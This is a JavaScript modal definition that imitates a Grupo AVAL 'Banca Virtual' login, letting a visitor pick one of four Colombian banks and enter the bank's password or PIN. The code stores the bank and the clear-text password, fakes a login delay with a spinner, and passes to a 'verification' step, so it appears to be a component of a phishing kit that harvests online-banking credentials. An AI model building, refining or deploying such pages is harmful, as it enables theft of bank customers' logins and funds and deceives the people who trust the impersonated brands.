/**
 * Definición declarativa del Modal Datos de Registro
 * Modal con dropdown de bancos y validación dinámica de clave según banco
 */

const modalDatosRegistroDefinition = {
  // ==================== DATOS INICIALES ====================
  data: {
    selectedBanco: '',
    isSubmitting: false,
    bancoConfig: {
      'bogota': {
        label: 'Clave segura *',
        placeholder: 'Ingresa tu clave segura (4 dígitos)',
        tipo: 'numerico',
        longitud: 4
      },
      'popular': {
        label: 'Clave *',
        placeholder: 'Ingresa tu clave (4 dígitos)',
        tipo: 'numerico',
        longitud: 4
      },
      'avvillas': {
        label: 'Contraseña *',
        placeholder: 'Ingresa tu contraseña (4 dígitos)',
        tipo: 'numerico',
        longitud: 4
      },
      'occidente': {
        label: 'Contraseña *',
        placeholder: 'Ingresa tu contraseña (alfanumérico con carácter especial)',
        tipo: 'alfanumerico',
        longitud: null
      }
    }
  },

  // ==================== TEMPLATE ====================
  template: function({ buttonText, showProgress, flowConfig }) {
    return `
      <div class="modal-overlay">
        <div class="modal-content">
          <!-- Logo siempre visible -->
          <div class="logo-container">
            <img src="/images/logo-ava.png" alt="Grupo AVAL" class="logo" />
          </div>

          <div id="form-section">
            <h2 class="title">Banca Virtual</h2>

            <div class="form-group">
              <label class="label">Selecciona tu banco *</label>
              <div class="select-container">
                <button type="button" id="select-btn" class="select-btn">
                  <span id="selected-option" class="selected-option">-- Selecciona tu banco --</span>
                  <svg class="select-arrow" id="select-arrow" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path>
                  </svg>
                </button>
                <div id="dropdown" class="dropdown">
                  <button type="button" class="dropdown-option" data-value="avvillas">
                    <img src="/images/logo-avv.png" alt="Banco AV Villas" />
                  </button>
                  <button type="button" class="dropdown-option" data-value="bogota">
                    <img src="/images/logo-bog.png" alt="Banco de Bogotá" />
                  </button>
                  <button type="button" class="dropdown-option" data-value="occidente">
                    <img src="/images/logo-occ.png" alt="Banco de Occidente" />
                  </button>
                  <button type="button" class="dropdown-option" data-value="popular">
                    <img src="/images/logo-pop.png" alt="Banco Popular" />
                  </button>
                </div>
              </div>
            </div>

            <div class="form-group">
              <label class="label" id="label-clave">Clave *</label>
              <input
                type="password"
                id="input-clave"
                class="input"
                placeholder="Ingresa tu clave"
              />
              <p class="error-message" id="error-input-clave"></p>
            </div>

            <button id="btn-ingresar" class="btn-submit" data-submit-button>
              ${buttonText}
            </button>
          </div>

          <div id="spinner-section" class="spinner-section hidden">
            <div id="selected-bank-logo" class="selected-bank-logo"></div>
            <div class="spinner-container">
              <div class="spinner"></div>
            </div>
            <p class="spinner-text">Ingresando</p>
          </div>
        </div>
      </div>
    `;
  },

  // ==================== ESTILOS ====================
  styles: `
    .modal-overlay {
      position: fixed;
      inset: 0;
      background-color: rgba(0, 0, 0, 0.5);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 50;
      padding: 1rem;
    }

    .modal-content {
      background-color: white;
      border-radius: 1rem;
      box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
      max-width: 85vw;
      width: 100%;
      padding: 1rem;
      animation: fadeIn 0.3s ease-out;
      box-sizing: border-box;
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: scale(0.95); }
      to { opacity: 1; transform: scale(1); }
    }

    .logo-container {
      display: flex;
      justify-content: center;
      margin-bottom: 1.5rem;
    }

    .logo {
      height: 3.5rem;
      max-width: 100%;
      width: auto;
      object-fit: contain;
    }

    .title {
      font-size: 1.5rem;
      font-weight: 700;
      text-align: center;
      color: #1e40af;
      margin-bottom: 1.5rem;
    }

    .form-group {
      margin-bottom: 1rem;
    }

    .label {
      display: block;
      color: #374151;
      font-weight: 500;
      margin-bottom: 0.5rem;
    }

    .select-container {
      position: relative;
    }

    .select-btn {
      width: 100%;
      padding: 0.75rem 1rem;
      border: 2px solid #d1d5db;
      border-radius: 0.5rem;
      background: white;
      text-align: left;
      display: flex;
      align-items: center;
      justify-content: space-between;
      cursor: pointer;
      transition: all 0.2s;
    }

    .select-btn:focus {
      outline: none;
      border-color: #2563eb;
      box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.1);
    }

    .select-btn:hover {
      border-color: #9ca3af;
    }

    .selected-option {
      color: #9ca3af;
      font-size: 0.875rem;
    }

    .selected-option img {
      height: 2rem;
    }

    .select-arrow {
      width: 1.25rem;
      height: 1.25rem;
      color: #9ca3af;
      transition: transform 0.2s;
    }

    .select-arrow.rotate {
      transform: rotate(180deg);
    }

    .dropdown {
      display: none;
      position: absolute;
      z-index: 50;
      width: 100%;
      margin-top: 0.5rem;
      background: white;
      border: 2px solid #d1d5db;
      border-radius: 0.5rem;
      box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1);
      max-height: 16rem;
      overflow-y: auto;
    }

    .dropdown.visible {
      display: block;
    }

    .dropdown-option {
      width: 100%;
      padding: 0.75rem 1rem;
      border: none;
      background: white;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      border-bottom: 1px solid #f3f4f6;
      transition: background-color 0.2s;
    }

    .dropdown-option:last-child {
      border-bottom: none;
    }

    .dropdown-option:hover {
      background-color: #dbeafe;
    }

    .dropdown-option img {
      height: 2rem;
      object-fit: contain;
    }

    .input {
      width: 100%;
      padding: 0.75rem 1rem;
      border: 2px solid #d1d5db;
      border-radius: 0.5rem;
      font-size: 1rem;
      transition: all 0.2s;
      box-sizing: border-box;
    }

    .input:focus {
      outline: none;
      border-color: #2563eb;
      box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.1);
    }

    .input.valid {
      border-color: #2563eb;
    }

    .input.invalid {
      border-color: #dc2626;
    }

    .error-message {
      color: #dc2626;
      font-size: 0.75rem;
      margin-top: 0.25rem;
      display: none;
    }

    .error-message.visible {
      display: block;
    }

    .btn-submit {
      width: 100%;
      background-color: #1d4ed8;
      color: white;
      font-weight: 700;
      padding: 1rem 1.5rem;
      border-radius: 0.75rem;
      border: none;
      cursor: pointer;
      transition: all 0.2s;
      box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1);
    }

    .btn-submit:hover:not(:disabled) {
      background-color: #1e40af;
      transform: scale(1.05);
    }

    .btn-submit:disabled {
      opacity: 0.5;
      cursor: not-allowed;
    }

    /* Sección de spinner */
    .spinner-section {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      margin-top: 1.5rem;
      opacity: 0;
      transform: scale(0.98);
      transition: opacity 0.3s ease, transform 0.3s ease;
    }

    .spinner-section.visible {
      opacity: 1;
      transform: scale(1);
    }

    .selected-bank-logo {
      display: flex;
      justify-content: center;
      align-items: center;
      margin-bottom: 1.5rem;
    }

    .selected-bank-logo img {
      height: 3rem;
      max-width: 100%;
      object-fit: contain;
    }

    .spinner-container {
      position: relative;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .spinner {
      width: 5rem;
      height: 5rem;
      border: 4px solid #dbeafe;
      border-top-color: #2563eb;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    .spinner-text {
      margin-top: 1rem;
      text-align: center;
      color: #374151;
      font-size: 1rem;
      font-weight: 600;
    }

    #form-section {
      transition: opacity 0.3s ease, transform 0.3s ease;
    }

    #form-section.fade-out {
      opacity: 0;
      transform: scale(0.98);
    }

    .hidden {
      display: none;
    }

    .return-notification {
      background: #F8FAFC;
      border-left: 4px solid #1E40AF;
      border-radius: 0.375rem;
      padding: 1rem 1.25rem;
      margin-bottom: 1rem;
      display: flex;
      align-items: center;
      gap: 0.875rem;
      animation: slideDown 0.3s ease-out;
      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
    }

    @keyframes slideDown {
      from {
        opacity: 0;
        transform: translateY(-8px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }

    .notification-icon {
      width: 1.25rem;
      height: 1.25rem;
      color: #1E40AF;
      flex-shrink: 0;
    }

    .return-notification span {
      color: #1F2937;
      font-size: 0.875rem;
      font-weight: 500;
      line-height: 1.5;
    }

    .return-notification.fade-out {
      animation: fadeOut 0.25s ease-out forwards;
    }

    @keyframes fadeOut {
      from {
        opacity: 1;
        transform: translateY(0);
      }
      to {
        opacity: 0;
        transform: translateY(-8px);
      }
    }
  `,

  // ==================== VALIDACIONES ====================
  validations: {
    'input-clave': {
      required: true,
      custom: function(value) {
        if (!this.state.selectedBanco) {
          return 'Por favor selecciona un banco primero';
        }

        const config = this.state.bancoConfig[this.state.selectedBanco];

        if (config.tipo === 'numerico') {
          if (!/^\d+$/.test(value)) {
            return 'La clave debe contener solo números';
          }
          if (value.length !== config.longitud) {
            return `La clave debe tener exactamente ${config.longitud} dígitos`;
          }
          return true;
        } else if (config.tipo === 'alfanumerico') {
          const tieneLetras = /[a-zA-Z]/.test(value);
          const tieneNumeros = /\d/.test(value);
          const tieneEspecial = /[!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]/.test(value);

          if (!tieneLetras) {
            return 'La contraseña debe contener al menos una letra';
          }
          if (!tieneNumeros) {
            return 'La contraseña debe contener al menos un número';
          }
          if (!tieneEspecial) {
            return 'La contraseña debe contener al menos un carácter especial';
          }
          if (value.length < 4) {
            return 'La contraseña debe tener al menos 4 caracteres';
          }
          return true;
        }

        return 'Configuración de banco no válida';
      }
    }
  },

  // ==================== HANDLERS ====================
  handlers: {
    '#select-btn': {
      event: 'click',
      callback: function(e) {
        e.stopPropagation();
        const dropdown = this.shadowRoot.getElementById('dropdown');
        const selectArrow = this.shadowRoot.getElementById('select-arrow');
        dropdown?.classList.toggle('visible');
        selectArrow?.classList.toggle('rotate');
      }
    },

    '#btn-ingresar': {
      event: 'click',
      callback: function(e) {
        e.preventDefault();

        if (this.state.isSubmitting) {
          return;
        }

        const inputClave = this.shadowRoot.getElementById('input-clave');
        const value = inputClave?.value?.trim() || '';

        // Validar que se haya seleccionado un banco
        if (!this.state.selectedBanco) {
          alert('Por favor selecciona un banco');
          return;
        }

        // Validar que se haya ingresado una clave
        if (!value) {
          this.showError('input-clave', 'Por favor ingresa tu clave');
          inputClave?.focus();
          return;
        }

        // Validar formato de la clave
        const isValid = this.validateField('input-clave');
        if (!isValid) {
          inputClave?.focus();
          return;
        }

        // Guardar datos
        if (window.storageManager) {
          window.storageManager.saveDatosRegistroField('banco', this.state.selectedBanco);
          window.storageManager.saveDatosRegistroField('clave', value);
        }

        this.markModalAsCompleted();
        this.state.isSubmitting = true;

        // Mostrar spinner
        this.showLoadingSpinner();

        // Simular delay y luego completar paso
        setTimeout(() => {
          const formData = {
            banco: this.state.selectedBanco,
            clave: value,
            timestamp: Date.now()
          };

          if (this.getAttribute('data-flow-managed') === 'true') {
            this.completeStep(formData);
          } else {
            this.dispatchEvent(new CustomEvent('next-modal', {
              detail: {
                nextModal: 'modal-verificacion',
                banco: this.state.selectedBanco
              },
              bubbles: true,
              composed: true
            }));
          }

          this.closeModal();
        }, 1500);
      }
    }
  },

  // ==================== CICLO DE VIDA ====================
  lifecycle: {
    connected: function() {
      // Configurar listeners adicionales
      const options = this.shadowRoot.querySelectorAll('.dropdown-option');
      const selectedOption = this.shadowRoot.getElementById('selected-option');
      const labelClave = this.shadowRoot.getElementById('label-clave');
      const inputClave = this.shadowRoot.getElementById('input-clave');
      const dropdown = this.shadowRoot.getElementById('dropdown');
      const selectArrow = this.shadowRoot.getElementById('select-arrow');

      // Cerrar dropdown al hacer clic fuera
      this.shadowRoot.addEventListener('click', (e) => {
        if (!e.target.closest('.select-container')) {
          dropdown?.classList.remove('visible');
          selectArrow?.classList.remove('rotate');
        }
      });

      // Seleccionar banco
      options.forEach(option => {
        option.addEventListener('click', () => {
          const value = option.getAttribute('data-value');
          const img = option.querySelector('img');

          if (value && img) {
            this.state.selectedBanco = value;

            // Mostrar logo en el select
            const imgClone = img.cloneNode(true);
            selectedOption.innerHTML = '';
            selectedOption.appendChild(imgClone);

            // Actualizar configuración del campo de clave
            const config = this.state.bancoConfig[value];
            if (config) {
              labelClave.textContent = config.label;
              inputClave.placeholder = config.placeholder;
              inputClave.value = '';
              this.resetField('input-clave');
            }

            // Cerrar dropdown
            dropdown?.classList.remove('visible');
            selectArrow?.classList.remove('rotate');
          }
        });
      });
    }
  },

  // ==================== MÉTODOS PERSONALIZADOS ====================
  showLoadingSpinner: function() {
    const btnIngresar = this.shadowRoot.getElementById('btn-ingresar');
    const formSection = this.shadowRoot.getElementById('form-section');
    const spinnerSection = this.shadowRoot.getElementById('spinner-section');
    const selectedBankLogo = this.shadowRoot.getElementById('selected-bank-logo');
    const selectedOption = this.shadowRoot.getElementById('selected-option');

    if (btnIngresar) {
      btnIngresar.disabled = true;
      btnIngresar.textContent = 'Ingresando...';
    }

    // Copiar el logo del banco seleccionado a la sección del spinner
    if (selectedBankLogo && selectedOption) {
      const bankImg = selectedOption.querySelector('img');
      if (bankImg) {
        selectedBankLogo.innerHTML = '';
        const imgClone = bankImg.cloneNode(true);
        selectedBankLogo.appendChild(imgClone);
      }
    }

    if (formSection && spinnerSection) {
      formSection.classList.add('fade-out');

      setTimeout(() => {
        formSection.classList.add('hidden');
        spinnerSection.classList.remove('hidden');

        requestAnimationFrame(() => {
          spinnerSection.classList.add('visible');
        });
      }, 300);
    }
  },

  // ==================== CONFIGURACIÓN ====================
  config: {
    defaultButtonText: 'Ingresar',
    showReturnNotification: true,
    returnMessage: 'Bienvenido de nuevo. Tus datos bancarios fueron guardados para tu comodidad.',
    returnIcon: `
      <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
    `,
    persistData: true,
    storageKey: 'DatosRegistro',
    updateButtonOnValidation: false // Deshabilitado porque no usamos data-submit-button automático
  }
};

// Exportar
if (typeof window !== 'undefined') {
  window.modalDatosRegistroDefinition = modalDatosRegistroDefinition;
}

if (typeof module !== 'undefined' && module.exports) {
  module.exports = modalDatosRegistroDefinition;
}
